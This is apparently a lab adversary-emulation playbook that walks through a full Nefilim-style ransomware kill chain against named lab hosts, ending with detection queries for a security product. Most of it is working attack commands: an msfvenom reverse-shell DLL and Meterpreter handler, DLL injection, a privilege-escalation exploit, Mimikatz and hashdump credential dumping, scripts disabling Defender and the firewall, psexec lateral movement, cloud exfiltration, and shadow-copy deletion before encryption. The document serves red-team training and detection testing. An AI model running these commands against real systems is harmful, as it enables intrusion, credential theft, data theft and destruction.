# Nefilim Ransomware: Execution Plan

See `Nefilim_README.md` for overview and ATT&CK mapping. This document has the step-by-step commands for all 11 stages.

**Source:** Based on [GPENBuddyT Nefilim Ransomware Adversary Emulation Guide](https://github.com/btforensics/GPENBuddyT/wiki/Nefilim-Ransomware-Adversary-Emulation-Guide)

---

## Infrastructure Setup

### On MORPHEUS (Attacker, Kali Linux)

**Install dependencies and tools**
```bash
apt update && apt install -y \
  metasploit-framework \
  mimikatz \
  hashcat \
  putty-tools \
  p7zip-full \
  nmap \
  openssh-server \
  git \
  curl

mkdir -p /home/kali/nefilim /tmp/loot
cd /home/kali/nefilim
```

**Download required tools**

1. **CVE-2019-19781 Citrix Scanner** (TrustedSec)
```bash
cd /home/kali/nefilim
git clone https://github.com/trustedsec/cve-2019-19781.git
cd cve-2019-19781
chmod +x cve-2019-19781_scanner.py
```

2. **CVE-2017-0213 Privilege Escalation Exploit** (WindowsExploits)
```bash
cd /home/kali/nefilim
git clone https://github.com/WindowsExploits/Exploits.git
# The executable is in: Exploits/CVE-2017-0213/
cp Exploits/CVE-2017-0213/CVE-2017-0213_x64.exe .
```

3. **AdFind** (JoeWare)
Download from: https://www.joeware.net/files/rootkit/AdFind.zip
```bash
# Extract and place in /home/kali/nefilim/
unzip AdFind.zip -d /home/kali/nefilim/
```

4. **BloodHound/SharpHound** (BloodHoundAD)
```bash
cd /home/kali/nefilim
git clone https://github.com/BloodHoundAD/BloodHound.git
# Download SharpHound.exe pre-compiled from: 
# https://github.com/BloodHoundAD/BloodHound/releases/
wget https://github.com/BloodHoundAD/BloodHound/releases/download/v4.3.1/SharpHound.exe
```

5. **APTSimulator** (Nextron Systems)
```bash
cd /home/kali/nefilim
git clone https://github.com/NextronSystems/APTSimulator.git
cd APTSimulator
# Extract APTSimulator.zip if needed
```

6. **PowerSploit** (for DLL injection on victim)
```bash
cd /home/kali/nefilim
git clone https://github.com/PowerShellMafia/PowerSploit.git
# Copy Invoke-DllInjection.ps1 to shared location for victim download
```

7. **PsExec** (SysInternals)
```bash
cd /home/kali/nefilim
wget https://live.sysinternals.com/PsExec64.exe
mv PsExec64.exe PsExec.exe
```

**Configure Meterpreter listener** (used in Persistence stage)
```bash
# Start msfconsole
msfconsole

# At msf prompt:
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.150.50
set LPORT 4949
exploit -j

# Handler is now listening. Continue to STEP 2.
```

**Create test ransomware emulator** (optional, for Stage 11)
If you have an existing Nefilim emulator binary from your lab, place it in:
```bash
/home/kali/nefilim/nefilim_emulate.exe
```
Otherwise, you can simulate encryption manually in Stage 11.

### On Windows Targets (NEO, TRINITY, NEB, ZION)

- Domain-joined to `corp.lab`
- Admin credentials: `Administrator` / `<LAB_ADMIN_PASSWORD>`
- Time synchronized
- Vision One agent monitoring
- Windows Defender enabled (for realistic telemetry)

---

## Pre-Execution Checklist

- [ ] All VMs network connectivity verified (ping tests)
- [ ] Time synchronized across all hosts (`net time /domain`)
- [ ] STEP 0 test files created on all targets
- [ ] Metasploit listener configured and running on MORPHEUS
- [ ] All tools downloaded to /home/kali/nefilim/
- [ ] Lab snapshots taken (CRITICAL before Stage 11)
- [ ] Isolated network verified (no internet except controlled exfil path)

---

## STEP 0: Create Test Data (Sensitive Files)

**On NEO (192.168.150.21)**
```powershell
$docPath = "C:\Users\Administrator\Documents"
mkdir $docPath -Force

"Financial Data Q3 2025 - Confidential" | Out-File "$docPath\Financial_Report.xlsx"
"Executive Strategy - DO NOT DISTRIBUTE" | Out-File "$docPath\Strategy.docx"
"Customer Database - PII" | Out-File "$docPath\Customers.xlsx"
"Intellectual Property - Trade Secrets" | Out-File "$docPath\Patents.pdf"

dir $docPath\*
```

**On TRINITY (192.168.150.22)**
```powershell
$docPath = "C:\Users\Administrator\Documents"
mkdir $docPath -Force

"Project Phoenix Budget - CONFIDENTIAL" | Out-File "$docPath\Project_Budget.xlsx"
"HR Policies 2025" | Out-File "$docPath\HR_Policies.docx"
"Employee Salaries - CONFIDENTIAL" | Out-File "$docPath\Payroll.xlsx"
"Performance Reviews - PII" | Out-File "$docPath\Reviews.docx"

dir $docPath\*
```

**On NEB (192.168.150.20) - File Server**
```powershell
# Create shared operation folder
$sharedPath = "C:\shared\OperationBerenstain"
mkdir $sharedPath -Force

"Marketing Strategy Q4 2025" | Out-File "$sharedPath\Marketing_Plan.docx"
"Sales Pipeline - Executive Summary" | Out-File "$sharedPath\Sales_Data.xlsx"
"Contracts 2025 - Legal" | Out-File "$sharedPath\Contracts.pdf"
"Source Code Repository Dump" | Out-File "$sharedPath\SourceCode.zip"
"Database Backups" | Out-File "$sharedPath\DB_Backup.bak"

# Create share
net share OperationBerenstain=$sharedPath /grant:Everyone,FULL

dir $sharedPath\*
net share OperationBerenstain
```

---

## STAGE 1: Initial Access (T1190)

**Exploit Public-Facing Application: Citrix ADC RCE (CVE-2019-19781)**

Nefilim operators are known to exploit Citrix Application Delivery Controller devices for initial access. In this emulation, we assume a vulnerable Citrix ADC/Gateway is accessible at `192.168.150.25` (or substitute with your environment's public-facing app).

**From MORPHEUS, scan for vulnerable Citrix ADC**
```bash
cd /home/kali/nefilim/cve-2019-19781
./cve-2019-19781_scanner.py 192.168.150.20/24 443

# Expected output: Identifies vulnerable Citrix devices on network
# If vulnerable: "Target is potentially vulnerable!"
```

**Alternative: Assume Breach on NEO**
If no Citrix is available, assume the attacker has already compromised NEO via:
- Phishing (Word macro)
- USB drop
- Supply chain compromise

For this scenario, RDP to NEO as Administrator and proceed to STAGE 2.

---

## STAGE 2: Persistence (T1574.002)

**Hijack Execution Flow: DLL Side-Loading with Meterpreter Reverse Shell**

**On MORPHEUS, generate malicious DLL**
```bash
cd /home/kali/nefilim

# Generate 64-bit Meterpreter reverse_tcp DLL payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.150.50 \
  LPORT=4949 \
  -f dll > fsociety.dll

# Verify DLL was created
ls -lah fsociety.dll
```

**Ensure Metasploit listener is running** (from Infrastructure Setup)
```bash
# If not already running:
msfconsole -r /path/to/handler.rc
# Or manually in msfconsole:
# use exploit/multi/handler
# set PAYLOAD windows/x64/meterpreter/reverse_tcp
# set LHOST 192.168.150.50
# set LPORT 4949
# exploit -j
```

**On NEO (victim), download PowerSploit**

In PowerShell:
```powershell
# Download PowerSploit Invoke-DllInjection.ps1
$url = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1"
Invoke-WebRequest -Uri $url -OutFile C:\temp\Invoke-DllInjection.ps1

# Or manually download from GitHub and transfer via SMB
```

**On NEO, inject malicious DLL into explorer.exe**

In PowerShell:
```powershell
# Load the DLL injection module
Import-Module C:\temp\Invoke-DllInjection.ps1

# Find explorer.exe PID
Get-Process explorer

# Execute DLL injection (example PID 5800)
# NOTE: This requires the fsociety.dll to be accessible on NEO
# Transfer it via SMB first:
# Copy-Item \\192.168.150.50\nefilim\fsociety.dll C:\temp\

Invoke-DllInjection -ProcessID 5800 -Dll "C:\temp\fsociety.dll"
```

**Verify callback on MORPHEUS Metasploit**
```
# In msfconsole, check for new session:
sessions
# You should see: "Active sessions: 1"

# Interact with the session:
sessions -i 1
# Now you have a Meterpreter shell on NEO
```

---

## STAGE 3: Privilege Escalation (T1068)

**Exploitation for Privilege Escalation: CVE-2017-0213**

Nefilim uses kernel exploits to escalate from user to SYSTEM. We'll use CVE-2017-0213 (Windows Device Guard Policy.

**Transfer exploit to NEO**
```bash
# From MORPHEUS, copy CVE-2017-0213 to NEO
# Using SMB (from NEO as Admin):
net use \\192.168.150.50\nefilim /user:Administrator <LAB_ADMIN_PASSWORD>
copy \\192.168.150.50\nefilim\CVE-2017-0213_x64.exe C:\Windows\Temp\
```

**On NEO, execute exploit**
```powershell
C:\Windows\Temp\CVE-2017-0213_x64.exe

# Expected output: Token impersonation or privilege escalation confirmation
# Verify with: whoami /priv
# Should show: "SeImpersonatePrivilege" or "SeDebugPrivilege" enabled
```

---

## STAGE 4: Defense Evasion (T1550, T1562.001, T1070.004)

### 4.1 Pass-the-Hash (T1550)

**On MORPHEUS, extract NTLM hashes from NEO** (using Meterpreter session from Stage 2)
```bash
msfconsole

use post/windows/gather/hashdump
set SESSION 1
run

# Expected output: Administrator NTLM hash
# Example: Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 :::
```

Save the hash for later use in lateral movement.

### 4.2 Disable/Modify Antivirus (T1562.001)

**On NEO, disable Windows Defender** (as SYSTEM/ADMIN)
```powershell
# Via PowerShell (elevated):
Set-MpPreference -DisableRealtimeMonitoring $true

# Or disable via Group Policy
gpedit.msc
# Navigate to: Computer Configuration > Admin Templates > Windows Components > Windows Defender
# Set "Turn Off Windows Defender" to "Enabled"

# Verify:
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled
```

### 4.3 Indicator Removal: File Deletion (T1070.004)

**On MORPHEUS, after all Stage 1-3 actions, delete the initial payload**
```bash
rm -f /home/kali/nefilim/cve-2019-19781_payload.bin
rm -f /tmp/loot/*
```

**On NEO, delete the exploit binary**
```powershell
del C:\Windows\Temp\CVE-2017-0213_x64.exe /f /q
del C:\temp\Invoke-DllInjection.ps1 /f /q
del C:\temp\fsociety.dll /f /q
```

---

## STAGE 5: Credential Access (T1003, T1555)

### 5.1 OS Credential Dumping with Mimikatz (T1003)

**On NEO, download and run Mimikatz**
```powershell
# Download Mimikatz
$url = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810/mimikatz_trunk.zip"
Invoke-WebRequest -Uri $url -OutFile C:\temp\mimikatz.zip

# Extract
Expand-Archive C:\temp\mimikatz.zip -DestinationPath C:\temp\mimikatz

# Run Mimikatz (requires SYSTEM or Admin)
C:\temp\mimikatz\x64\mimikatz.exe

# In Mimikatz prompt:
log C:\temp\mimikatz_dump.txt
privilege::debug
sekurlsa::logonpasswords
exit
```

**Review credentials dumped**
```powershell
type C:\temp\mimikatz_dump.txt

# Expected output includes:
# - Current logged-in user credentials
# - Cached domain credentials (if any)
# - NTLM hashes
# - Kerberos tickets
```

### 5.2 Credentials from Password Stores (T1555)

**Download and run Network Password Recovery** (Nirsoft)
```powershell
# Download Network Password Recovery
$url = "https://www.nirsoft.net/utils/network_password_recovery.zip"
Invoke-WebRequest -Uri $url -OutFile C:\temp\netpass.zip

# Extract
Expand-Archive C:\temp\netpass.zip -DestinationPath C:\temp\netpass

# Run
C:\temp\netpass\NetworkPasswordRecovery.exe

# Export credentials to file:
# File > Export Selected Items > CSV
# Should reveal saved Wi-Fi passwords, VPN credentials, RDP saved passwords, etc.
```

---

## STAGE 6: Discovery (T1082, T1046, T1018, T1482, T1083, T1049)

### 6.1 System Information Discovery (T1082)

**On NEO, query system info and Cryptography GUID**
```powershell
systeminfo
ipconfig /all
hostname

# Nefilim specifically queries Cryptographic Machine GUID
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid
```

### 6.2 Network Service Scanning (T1046)

**On MORPHEUS, use NetScan or Nmap to discover active systems**
```bash
# Using nmap (already installed on Kali)
nmap -sV -p 445,3389,139 192.168.150.0/24

# Expected output: Lists all SMB/RDP-accessible systems in lab network
```

### 6.3 Remote System Discovery (T1018)

**On NEO, query hosts file**
```powershell
type C:\Windows\System32\drivers\etc\hosts
```

### 6.4 Domain Trust Discovery (T1482)

**On NEO, use AdFind to enumerate Active Directory**

First, transfer AdFind.exe from MORPHEUS to NEO:
```powershell
net use \\192.168.150.50\nefilim /user:Administrator <LAB_ADMIN_PASSWORD>
copy \\192.168.150.50\nefilim\AdFind.exe C:\temp\
```

**Run AdFind queries**
```cmd
C:\temp\AdFind.exe -f "(objectcategory=person)" > C:\temp\ad_users.txt
C:\temp\AdFind.exe -f "objectcategory=computer" > C:\temp\ad_computers.txt
C:\temp\AdFind.exe -sc trustdmp > C:\temp\trustdmp.txt
C:\temp\AdFind.exe -subnets -f (objectCategory=subnet) > C:\temp\subnets.txt
C:\temp\AdFind.exe -sc dclist > C:\temp\dclist.txt

# Review results
type C:\temp\ad_computers.txt
type C:\temp\ad_users.txt
```

**Alternative: Use SharpHound for BloodHound ingestion**
```powershell
# Transfer SharpHound.exe from MORPHEUS to NEO
copy \\192.168.150.50\nefilim\SharpHound.exe C:\temp\

# Run SharpHound
C:\temp\SharpHound.exe -c All -d corp.lab

# This will create .zip files with AD data
# Can be imported into BloodHound for attack path analysis
```

### 6.5 File and Directory Discovery (T1083)

**On NEO, enumerate file system**
```powershell
# Discover files recursively
Get-ChildItem -Path C:\Users -Recurse -Include *.docx, *.xlsx, *.pdf -ErrorAction SilentlyContinue

# Or use tree command
tree C:\Users /f
```

### 6.6 System Network Connections Discovery (T1049)

**On NEO, enumerate network shares and mapped drives**
```powershell
net use
net share
net view
net view /all

# Map to remote shares
net use Z: \\192.168.150.20\OperationBerenstain /user:Administrator <LAB_ADMIN_PASSWORD>
dir Z:\
```

---

## STAGE 7: Lateral Movement (T1570, T1021.002)

### 7.1 Create lateral movement batch scripts

**On MORPHEUS, create batch files to transfer malware to TRINITY**

Create `disable_av.bat` (disables security services on target):
```batch
@echo off
REM Disable Windows Defender Real-time Protection
powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

REM Kill AV processes
taskkill /im MsMpEng.exe /f
taskkill /im WinDefend.exe /f

REM Disable Windows Firewall
netsh advfirewall set allprofiles state off

REM Disable automatic Windows updates
sc config wuauserv start= disabled
sc stop wuauserv

echo AV and Firewall disabled
```

Create `copy_tools.bat` (transfers ransomware emulator to TRINITY):
```batch
@echo off
REM Transfer nefilim_emulate.exe to TRINITY
net use \\192.168.150.22\c$ /user:Administrator <LAB_ADMIN_PASSWORD>
copy nefilim_emulate.exe \\192.168.150.22\c$\Windows\Temp\
echo Ransomware transferred to TRINITY
```

### 7.2 Use Impacket to perform lateral movement

**On MORPHEUS, use psexec to execute commands on TRINITY**
```bash
cd /home/kali/nefilim

# Test credentials first with crackmapexec
crackmapexec smb 192.168.150.22 -u Administrator -p '<LAB_ADMIN_PASSWORD>'
# Expected output: "Pwn3d!" indicates success

# Execute disable_av.bat on TRINITY
impacket-psexec corp.lab/Administrator@192.168.150.22 \
  -p '<LAB_ADMIN_PASSWORD>' \
  cmd.exe /c "C:\Windows\Temp\disable_av.bat"

# Verify it worked:
# Get a remote shell on TRINITY
impacket-psexec corp.lab/Administrator@192.168.150.22 \
  -p '<LAB_ADMIN_PASSWORD>' \
  cmd.exe

# At remote shell:
C:\> whoami
C:\> Get-MpComputerStatus | select RealTimeProtectionEnabled
C:\> exit
```

### 7.3 Alternative: WMI-based lateral movement

**On MORPHEUS, use Impacket wmiexec**
```bash
impacket-wmiexec corp.lab/Administrator@192.168.150.22 \
  -p '<LAB_ADMIN_PASSWORD>' \
  cmd.exe /c "ipconfig"
```

### 7.4 Repeat for NEB (file server)

**Transfer and execute on NEB (192.168.150.20)**
```bash
# Copy ransomware to NEB shared folder
crackmapexec smb 192.168.150.20 -u Administrator -p '<LAB_ADMIN_PASSWORD>'

impacket-psexec corp.lab/Administrator@192.168.150.20 \
  -p '<LAB_ADMIN_PASSWORD>' \
  cmd.exe /c "copy \\192.168.150.50\nefilim\nefilim_emulate.exe C:\Windows\Temp\"
```

---

## STAGE 8: Collection (T1560.001)

**Archive Collected Data with 7zip**

**On TRINITY, prepare data archive**
```powershell
# Download 7zip if not present
choco install 7zip -y
# Or: Download from https://www.7-zip.org/download.html

# Create archive of sensitive files
$outPath = "C:\Users\Administrator\Documents\archive.7z"
$dataPath = "C:\Users\Administrator\Documents"

7z.exe a -p -mx=9 $outPath $dataPath

# Verify archive
dir C:\Users\Administrator\Documents\archive.7z
```

**On NEB, archive the shared folder**
```powershell
cd C:\Windows\Temp
7z.exe a -mx=9 neb_data.7z C:\shared\OperationBerenstain\

# Move archive to temp location for exfil
move C:\Windows\Temp\neb_data.7z C:\Users\Administrator\Documents\
```

---

## STAGE 9: Command and Control (T1071)

**Application Layer Protocol: Cobalt Strike Beacon Simulation**

**On MORPHEUS, simulate Cobalt Strike with APTSimulator**
```bash
cd /home/kali/nefilim/APTSimulator

# Run APTSimulator batch file (if Windows) or simulate C2 beacon
# For Linux:
bash APTSimulator.sh

# For Windows VM (simulated):
# Follow the GitHub instructions to run APTSimulator.bat
```

**Alternative: Maintain Meterpreter session** (from Stage 2)
```bash
# The Meterpreter reverse_tcp session from Stage 2 continues to serve as C2
# Commands can be executed through the persisted DLL injection

msfconsole
sessions -i 1
# Now execute any commands on the victim through this C2 channel
```

---

## STAGE 10: Exfiltration (T1567.002)

**Exfiltration Over Web Service: Cloud Storage (MEGASync)**

**On TRINITY, download and install MEGASync**
```powershell
# Download MEGASync installer from https://mega.nz/sync
$url = "https://mega.nz/sync"
# Or pre-download and transfer

# Install
msiexec /i MEGAsyncSetup64.msi /quiet

# Configure sync folder
mkdir C:\Users\Administrator\Documents\MEGASync
```

**On TRINITY, move archives to MEGASync**
```powershell
# Move collected archives to MEGASync folder
move C:\Users\Administrator\Documents\archive.7z C:\Users\Administrator\Documents\MEGASync\

# MEGASync will automatically sync to cloud storage
# Verify by checking MEGASync status:
Get-Process MEGASync
```

**Alternative: Manual cloud upload simulation**
```powershell
# If MEGASync is not available, simulate exfil by:
# 1. Copy to accessible location
# 2. Document as "would be exfiltrated to attacker-controlled cloud account"

copy C:\Users\Administrator\Documents\archive.7z C:\Windows\Temp\exfil_staging\
```

---

## STAGE 11: Impact (T1490, T1486)

### ⚠️ WARNING: DESTRUCTIVE STAGE ⚠️
This stage will permanently encrypt files on NEB. **VM snapshots are MANDATORY before proceeding.**

### 11.1 Inhibit System Recovery (T1490)

**On NEB, delete volume shadow copies**
```powershell
# Disable Windows Recovery
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy ignoreallfailures

# Delete volume shadow copies (prevents recovery)
wmic shadowcopy delete

# Delete backup catalog
wbadmin delete catalog -quiet

# Verify:
Get-Volume
wmic logicaldisk get name
```

### 11.2 Data Encryption (T1486)

**On MORPHEUS, transfer ransomware emulator to NEB**
```bash
# The nefilim_emulate.exe should already be on NEB from Stage 7
# Verify:
ls -lah /home/kali/nefilim/nefilim_emulate.exe

# If using actual emulator (from your lab environment):
# Ensure it's accessible
```

**On NEB, execute ransomware emulator**

⚠️ **STOP: Take VM snapshot NOW if you haven't already!**

```powershell
# Execute the ransomware emulator
C:\Windows\Temp\nefilim_emulate.exe

# Or via PsExec from MORPHEUS (last step of Stage 7):
# impacket-psexec corp.lab/Administrator@192.168.150.20 \
#   -p '<LAB_ADMIN_PASSWORD>' \
#   cmd.exe /c "C:\Windows\Temp\nefilim_emulate.exe"

# Expected behavior:
# - Files in C:\shared\OperationBerenstain\ are encrypted
# - Ransom note (NEFILIM-DECRYPT.txt or similar) appears
# - File extensions changed to .locked or .nefilim
```

### 11.3 Verify Encryption

**On NEB, check encrypted files**
```powershell
dir C:\shared\OperationBerenstain\

# Expected output:
# Marketing_Plan.docx.locked
# Sales_Data.xlsx.locked
# Contracts.pdf.locked
# etc.

# Verify files are unreadable
type C:\shared\OperationBerenstain\Contracts.pdf.locked
# Should output encrypted/binary data
```

**Check for ransom note**
```powershell
dir C:\shared\OperationBerenstain\NEFILIM-DECRYPT.txt
type C:\shared\OperationBerenstain\NEFILIM-DECRYPT.txt
```

---

## Troubleshooting

### Citrix CVE-2019-19781 scanner shows no vulnerability
- Verify Citrix ADC/Gateway IP is correct and accessible
- Ensure firewall allows HTTPS (port 443) access to Citrix device
- If no Citrix available, proceed with "Assume Breach" option (RDP to NEO as Admin)

### DLL injection fails on NEO
- Verify explorer.exe PID is correct: `Get-Process explorer`
- Ensure PowerSploit is downloaded to NEO
- Check that fsociety.dll is readable: `ls C:\temp\fsociety.dll`
- Verify Metasploit listener is running on MORPHEUS port 4949: `netstat -tlnp | grep 4949`

### Meterpreter callback doesn't connect
- Verify firewall allows inbound on MORPHEUS port 4949
- Test connectivity: `telnet 192.168.150.50 4949` (from NEO)
- Check LHOST/LPORT in msfvenom matches listener configuration

### Lateral movement (psexec) fails
- Verify SMB port 445 is open: `nmap -p 445 192.168.150.22`
- Test credentials: `crackmapexec smb 192.168.150.22 -u Administrator -p '<LAB_ADMIN_PASSWORD>'`
- Ensure admin account hasn't been disabled or locked
- Check network connectivity: `ping 192.168.150.22`

### AdFind/BloodHound queries return empty
- Verify TRINITY is domain-joined: `systeminfo | findstr "Domain"`
- Check AD replication: `replmon` or `repadmin /showrepl`
- Ensure DNS resolution works: `nslookup corp.lab`
- Verify user running query has domain access rights

### Ransomware encryption doesn't work
- Verify nefilim_emulate.exe exists and is executable
- Check file permissions on target directory (should be writable by SYSTEM)
- Disable antivirus completely: `Get-MpComputerStatus`
- Look for errors: `Get-EventLog -LogName System -Newest 20 | select -ExpandProperty Message`

### MEGASync exfiltration doesn't sync
- Verify MEGASync is installed and running: `Get-Process MEGASync`
- Check network connectivity to mega.nz
- Verify sync folder is configured correctly in MEGASync settings
- Monitor sync status: `Get-ChildItem C:\Users\Administrator\Documents\MEGASync`

---

## Expected Outcomes

✅ **STAGE 1 (Initial Access):** 15–30 minutes
- Citrix RCE exploit executed (or breach assumed)
- Foothold established on NEO
- Baseline telemetry generated (RCE, web application attack)

✅ **STAGE 2-3 (Persistence + Privilege Escalation):** 30–45 minutes
- DLL injection executed on NEO
- Meterpreter reverse shell callback received
- Privilege escalation to SYSTEM
- 5+ Vision One alerts (code execution, privilege escalation, unauthorized privileged access)

✅ **STAGE 4-5 (Defense Evasion + Credential Access):** 45 minutes
- AV disabled on NEO
- NTLM hashes dumped via hashdump and Mimikatz
- Password stores extracted
- 10+ Vision One alerts (AV bypass, credential dumping, security tool tampering)

✅ **STAGE 6 (Discovery):** 30 minutes
- Domain enumeration completed
- Network scanning identified all targets
- AD structure mapped
- File shares enumerated
- 8+ Vision One alerts (network reconnaissance, LDAP queries, SMB enumeration)

✅ **STAGE 7 (Lateral Movement):** 45–60 minutes
- Tools transferred to TRINITY and NEB
- Remote commands executed on TRINITY
- AV disabled on secondary targets
- 15+ Vision One alerts (lateral movement, administrative share access, process execution)

✅ **STAGE 8-10 (Collection + Exfiltration):** 45 minutes
- Archives created on TRINITY and NEB
- Files compressed with 7zip
- Exfiltration via MEGASync to cloud
- 5+ Vision One alerts (file archiving, data transfer, cloud access)

✅ **STAGE 11 (Impact):** 30 minutes
- Volume shadow copies deleted
- Windows recovery disabled
- Files encrypted on NEB
- Ransom note created
- 20+ Vision One alerts (file encryption, system recovery disabled, suspicious file activity)

✅ **Total scenario runtime:** 4–8 hours (full kill chain)

---

## Detection & Monitoring

**Vision One should detect all major TTPs throughout this scenario.**

### Vision One Workbench Queries

**Initial Access & Persistence**
```
objectAttackType:"Exploitation" OR objectAttackType:"Code Execution"
objectTactic:"initial-access"
objectProcessImageName:"meterpreter" OR objectProcessImageName:"cve-2019-19781"
```

**Credential Access**
```
objectAttackType:"Credential Access"
objectProcessImageName:"mimikatz.exe" OR objectProcessImageName:"hashdump" OR objectProcessImageName:"lsass.exe"
objectTactic:"credential-access"
```

**Discovery & Lateral Movement**
```
objectAttackType:"Lateral Movement" OR objectAttackType:"Discovery"
objectTactic:"discovery" OR objectTactic:"lateral-movement"
objectProcessImageName:"net.exe" OR objectProcessImageName:"nmap" OR objectProcessImageName:"adfind"
objectNetworkPortNumber:445 OR objectNetworkPortNumber:139
```

**Defense Evasion**
```
objectAttackType:"Defense Evasion"
objectEventType:"Security Tool Tampering"
objectEventType:"Windows Defender Disabled"
objectProcessImageName:"taskkill.exe" OR objectProcessImageName:"sc.exe"
```

**Collection & Exfiltration**
```
objectAttackType:"Collection" OR objectAttackType:"Exfiltration"
objectProcessImageName:"7za.exe" OR objectProcessImageName:"7z.exe"
objectTactic:"collection" OR objectTactic:"exfiltration"
objectNetworkProtocol:"https" AND objectNetworkDomain:"mega.nz"
```

**Impact**
```
objectAttackType:"Impact"
objectEventType:"File Encrypted"
objectEventType:"Ransomware"
objectProcessImageName:"wmic.exe" OR objectProcessImageName:"bcdedit.exe"
objectTactic:"impact"
```

**Entire kill chain (combined)**
```
(objectAttackType:"Exploitation" OR objectAttackType:"Lateral Movement" OR objectAttackType:"Credential Access" OR objectEventType:"File Encrypted")
AND (objectHostName:"NEO" OR objectHostName:"TRINITY" OR objectHostName:"NEB")
```

### SIEM Indicators

- **File extensions:** `.locked`, `.nefilim`, `.7z` created on network shares
- **Process chain:** explorer.exe → wmic.exe → bcdedit.exe → (ransomware binary)
- **Network indicators:** SMB 445 to multiple hosts, HTTPS to mega.nz
- **Registry modifications:** HKLM\System\CurrentControlSet\Control\CrashControl (recovery disabled)
- **Event IDs:** Event ID 4624 (multiple logons), 4688 (process creation), 5140 (network share access)

---

**For Training Use Only — Authorized Personnel Only**
